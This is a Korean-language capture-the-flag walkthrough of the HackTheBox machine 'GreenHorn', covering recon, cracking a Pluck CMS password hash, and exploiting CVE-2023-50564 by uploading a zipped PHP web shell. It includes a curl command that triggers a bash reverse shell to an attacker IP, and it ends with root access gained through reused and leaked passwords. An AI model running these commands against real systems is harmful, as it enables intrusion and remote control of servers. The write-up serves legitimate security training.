# GreenHorn - HackTheBox
## Recon
```bash
sudo nmap -p 22,80,3000 -sC -sV -vv -oA GreenHorn 10.10.11.25
```
<img width="1202" height="391" alt="image" src="https://github.com/user-attachments/assets/7164a0d0-f27b-4183-982b-7e448817fa65" />

- SSH(22)
- HTTP(80)
- HTTP(3000)

---
## HTTP(80)
- `/etc/hosts`에 `greenhorn.htb`추가.
<img width="1202" height="66" alt="image" src="https://github.com/user-attachments/assets/305cb01a-36e4-42bb-b3ba-a53e9d7121d5" />

### banner grabbing
```bash
whatweb http://greenhorn.htb

curl -IL http://greenhorn.htb
```
<img width="1202" height="544" alt="image" src="https://github.com/user-attachments/assets/46768b0b-9e9b-47f9-beba-0773fd9cf57e" />

<br>
<br>

- `/login.php`발견.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/b399aa82-40b2-4081-83de-d202eac5e53b" />

<br>
<br>

- 기본 패스워드를 넣어서 로그인을 시도하였으나 실패.
- `pluck 4.7.18`
<img width="1100" height="339" alt="image" src="https://github.com/user-attachments/assets/8ce2f9f0-5d24-4c0c-a84e-4eb7c9e0196a" />

---
## HTTP(3000)
- 3000번 포트 접속하여 서버 소스코드 확인.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/3f14645c-bf41-4fa4-9588-dec0ec88e65b" />

<br>
<br>

- `/login.php`에서 비밀번호가 `SHA512`로 햬싱되어서 전달되는 것으로 확인.
<img width="828" height="112" alt="image" src="https://github.com/user-attachments/assets/a9de3450-d929-42b5-a5c9-ede5cc117846" />

<br>
<br>

- `/data/inc/settings/pass.php`에서 기본 비밀번호처럼 보이는 해시 발견.
<img width="1632" height="247" alt="image" src="https://github.com/user-attachments/assets/7809d665-28af-4f85-b4c0-cbdc595b0e2a" />

<br>
<br>

- `hashcat`으로 크래킹하여 `iloveyou1`비밀번호 발견.
```bash
hashcat -m 1700 'd5443aef1b64544f3685bf112f6c405218c573c7279a831b1fe9612e3a4d770486743c5580556c0d838b51749de15530f87fb793afdcc689b6b39024d7790163' ~/util/rockyou.txt --show
```
<img width="1203" height="96" alt="image" src="https://github.com/user-attachments/assets/c91c6eae-54fa-4fc9-a595-1cd6ee860dd8" />

<br>
<br>

- 로그인 성공.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/de57e2c4-27cf-464e-a2ea-19f3089ff678" />

### CVE-2023-50564
- https://nvd.nist.gov/vuln/detail/CVE-2023-50564
<img width="1161" height="426" alt="image" src="https://github.com/user-attachments/assets/f6f5e2b9-488c-4563-aa38-8fab921818f9" />

<br>
<br>

- https://github.com/0xDTC/Pluck-CMS-v4.7.18-Remote-Code-Execution-CVE-2023-50564
- web shell코드를 zip파일로 압축.
```bash
cp /usr/share/webshells/php/simple-backdoor.php .

mv simple-backdoor.php ex.php

zip -r ex.zip ex.php
```
<img width="1207" height="78" alt="image" src="https://github.com/user-attachments/assets/dfc640e1-3079-42c5-bc16-4cb1db15926f" />

<br>
<br>

- `options > manage modules > install a module`
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/4e8e8930-d0c7-4605-b15f-7d06d5d75dfd" />

<br>
<br>

- `ex.zip` 업로드.
<img width="1100" height="602" alt="image" src="https://github.com/user-attachments/assets/8760241f-b900-4f34-9dc6-f901b9e71fd9" />

<br>
<br>

- 명령어 실행 성공.
<img width="1100" height="82" alt="image" src="https://github.com/user-attachments/assets/040e0214-d027-4a90-b45d-3920eee1803a" />

<br>
<br>

- 리버스 셸 코드 실행.
```bash
curl 'http://greenhorn.htb/data/modules/ex/ex.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%2Fdev%2Ftcp%2F10.10.14.14%2F80%200%3E%261%22'
```
<img width="1207" height="58" alt="image" src="https://github.com/user-attachments/assets/e379a4ab-ffe8-4a2d-8a1c-2483038d974d" />

<br>
<br>

- 셸 획득.
<img width="1207" height="173" alt="image" src="https://github.com/user-attachments/assets/7c367a0f-1aa1-4f02-bd31-397ac61790a1" />

---
## Privesc
- `/etc/passwd`에서 `junior`유저 발견.
```bash
cat /etc/passwd | grep sh$
```
<img width="1207" height="97" alt="image" src="https://github.com/user-attachments/assets/7df1a725-7b16-4e44-88c2-769cfbc4d29f" />

<br>
<br>

- `junior:iloveyou1`로그인.
<img width="1207" height="46" alt="image" src="https://github.com/user-attachments/assets/08922780-f335-4ac2-afff-1c92bf79e120" />

<br>
<br>

- `Using OpenVAS.pdf`파일을 로컬로 가져와서 확인해보니 패스워드에 블러처리.
- 여러가지 방법으로 블러처리를 없애려고 했으나 지속적으로 실패하여 크래킹 된 암호 `sidefromsidetheothersidesidefromsidetheotherside`참조.
<img width="1174" height="162" alt="image" src="https://github.com/user-attachments/assets/c1982384-25da-4ee3-b796-ec115d11b597" />

<br>
<br>

-`root:sidefromsidetheothersidesidefromsidetheotherside` 로그인.
```bash
su -
```
<img width="1205" height="76" alt="image" src="https://github.com/user-attachments/assets/955f3dd5-506b-4a05-a447-eb250cbb425a" />

---
## FLAG
- `/home/junior/user.txt`
<img width="1205" height="150" alt="image" src="https://github.com/user-attachments/assets/097a12e7-4df4-4112-aa87-2831e083dfc2" />

<br>
<br>

- `/root/root.txt`
<img width="1205" height="273" alt="image" src="https://github.com/user-attachments/assets/5311b16b-8bb2-45cf-b71d-e86f314454fe" />






















